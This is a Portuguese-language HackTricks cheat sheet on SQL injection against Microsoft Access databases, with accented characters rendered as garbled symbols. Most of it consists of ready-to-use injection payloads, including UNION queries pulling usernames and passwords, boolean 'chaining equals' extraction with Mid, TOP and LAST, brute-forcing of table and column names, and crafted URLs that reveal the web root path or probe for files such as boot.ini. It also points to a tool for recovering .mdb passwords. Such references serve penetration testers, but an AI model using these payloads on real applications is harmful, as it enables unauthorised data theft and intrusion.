# Inje√ß√£o de SQL no MS Access

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Playground Online

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## Limita√ß√µes do BD

### Concatena√ß√£o de Strings

A concatena√ß√£o de strings √© poss√≠vel com os caracteres `& (%26)` e `+ (%2b)`.
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Coment√°rios

N√£o h√° coment√°rios em MS Access, mas aparentemente √© poss√≠vel remover o √∫ltimo caractere de uma consulta com um caractere NULL:
```sql
1' union select 1,2 from table%00
```
Se isso n√£o funcionar, voc√™ sempre pode corrigir a sintaxe da consulta:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Consultas Empilhadas

Elas n√£o s√£o suportadas.

### LIMIT

O operador **`LIMIT`** **n√£o √© implementado**. No entanto, √© poss√≠vel limitar os resultados da consulta SELECT para as **primeiras N linhas da tabela usando o operador `TOP`**. `TOP` aceita como argumento um inteiro, representando o n√∫mero de linhas a serem retornadas.
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
Assim como o TOP, voc√™ pode usar o **`LAST`** que ir√° obter as **linhas do final**.

## Consultas de Uni√£o/Subconsultas

Em uma inje√ß√£o SQL, voc√™ geralmente deseja executar uma nova consulta para extrair informa√ß√µes de outras tabelas. O MS Access sempre exige que em **subconsultas ou consultas extras seja indicado um `FROM`**.\
Portanto, se voc√™ deseja executar um `UNION SELECT` ou `UNION ALL SELECT` ou um `SELECT` entre par√™nteses em uma condi√ß√£o, voc√™ sempre **precisa indicar um `FROM` com um nome de tabela v√°lido**.\
Portanto, voc√™ precisa saber um **nome de tabela v√°lido**.
```sql
-1' UNION SELECT username,password from users%00
```
### Encadeando equals + Substring

{% hint style="warning" %}
Isso permitir√° que voc√™ exfiltre valores da tabela atual sem precisar saber o nome da tabela.
{% endhint %}

O **MS Access** permite uma **sintaxe estranha** como **`'1'=2='3'='asd'=false`**. Como geralmente a inje√ß√£o de SQL estar√° dentro de uma cl√°usula **`WHERE`**, podemos abusar disso.

Imagine que voc√™ tenha uma inje√ß√£o de SQL em um banco de dados MS Access e sabe (ou adivinhou) que um **nome de coluna √© username**, e esse √© o campo que voc√™ deseja **exfiltrar**. Voc√™ pode verificar as diferentes respostas do aplicativo da web quando a t√©cnica de encadeamento de equals √© usada e potencialmente exfiltrar conte√∫do com uma **inje√ß√£o booleana** usando a fun√ß√£o **`Mid`** para obter substrings.
```sql
'=(Mid(username,1,3)='adm')='
```
Se voc√™ sabe o **nome da tabela** e **coluna** para extrair, pode usar uma combina√ß√£o entre `Mid`, `LAST` e `TOP` para **vazar todas as informa√ß√µes** via boolean SQLi:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Sinta-se √† vontade para testar isso no playground online._

### For√ßando nomes de tabelas

Usando a t√©cnica de encadeamento de iguais, voc√™ tamb√©m pode **for√ßar nomes de tabelas** com algo como:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
Voc√™ tamb√©m pode usar um m√©todo mais tradicional:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Sinta-se √† vontade para verificar isso no playground online._

* Nomes comuns de tabelas do Sqlmap: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* H√° outra lista em [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### For√ßando nomes de colunas

Voc√™ pode **for√ßar os nomes das colunas atuais** com o truque de encadeamento de iguais com:
```sql
'=column_name='
```
Ou com um **group by**:
```sql
-1' GROUP BY column_name%00
```
Ou voc√™ pode fazer brute-force nos nomes das colunas de uma **tabela diferente** com:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Extraindo dados

J√° discutimos a [**t√©cnica de encadeamento de iguais**](ms-access-sql-injection.md#chaining-equals-+-substring) **para extrair dados das tabelas atuais e de outras tabelas**. Mas existem outras maneiras:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
Em resumo, a consulta usa uma declara√ß√£o "se-ent√£o" para acionar um "200 OK" em caso de sucesso ou um "500 Internal Error" caso contr√°rio. Aproveitando o operador TOP 10, √© poss√≠vel selecionar os primeiros dez resultados. O subsequente uso de LAST permite considerar apenas a d√©cima tupla. Nesse valor, usando o operador MID, √© poss√≠vel realizar uma simples compara√ß√£o de caracteres. Mudando adequadamente o √≠ndice de MID e TOP, podemos extrair o conte√∫do do campo "username" para todas as linhas.

### Baseado em tempo

Verifique [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### Outras fun√ß√µes interessantes

* `Mid('admin',1,1)` obter substring da posi√ß√£o 1 com comprimento 1 (a posi√ß√£o inicial √© 1)
* `LEN('1234')` obter comprimento da string
* `ASC('A')` obter valor ascii do caractere
* `CHR(65)` obter string do valor ascii
* `IIF(1=1,'a','b')` se ent√£o
* `COUNT(*)` Contar n√∫mero de itens

## Enumerando tabelas

A partir daqui, voc√™ pode ver uma consulta para obter os nomes das tabelas: [**aqui**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database)
```sql
select MSysObjects.name
from MSysObjects
where
   MSysObjects.type In (1,4,6)
   and MSysObjects.name not like '~*'   
   and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
No entanto, observe que √© muito comum encontrar Inje√ß√µes SQL em que **voc√™ n√£o tem acesso para ler a tabela `MSysObjects`**.

### Acesso ao Sistema de Arquivos

#### Caminho Completo do Diret√≥rio Raiz da Web

O conhecimento do **caminho absoluto do diret√≥rio raiz da web pode facilitar ataques posteriores**. Se os erros do aplicativo n√£o estiverem completamente ocultos, o caminho do diret√≥rio pode ser descoberto tentando selecionar dados de um banco de dados inexistente.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

O MS Access responde com uma **mensagem de erro contendo o caminho completo do diret√≥rio da web**.

#### Enumera√ß√£o de Arquivos

O seguinte vetor de ataque pode ser usado para **inferir a exist√™ncia de um arquivo no sistema de arquivos remoto**. Se o arquivo especificado existir, o MS Access dispara uma mensagem de erro informando que o formato do banco de dados √© inv√°lido:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Outra maneira de enumerar arquivos consiste em **especificar um item de banco de dados.tabela**. **Se** o **arquivo especificado existir**, o MS Access exibe uma **mensagem de erro de formato de banco de dados**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

#### Adivinha√ß√£o do Nome do Arquivo .mdb

O **nome do arquivo do banco de dados (.mdb)** pode ser inferido com a seguinte consulta:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Onde **name\[i] √© um nome de arquivo .mdb** e **realTable √© uma tabela existente** dentro do banco de dados. Embora o MS Access sempre dispare uma mensagem de erro, √© poss√≠vel distinguir entre um nome de arquivo inv√°lido e um nome de arquivo .mdb v√°lido.

#### Quebrador de Senha do Arquivo .mdb

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) √© uma ferramenta gratuita que pode ser usada para recuperar a senha principal do banco de dados do Microsoft Access 95/97/2000/XP ou Jet Database Engine 3.0/4.0.

## Refer√™ncias

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
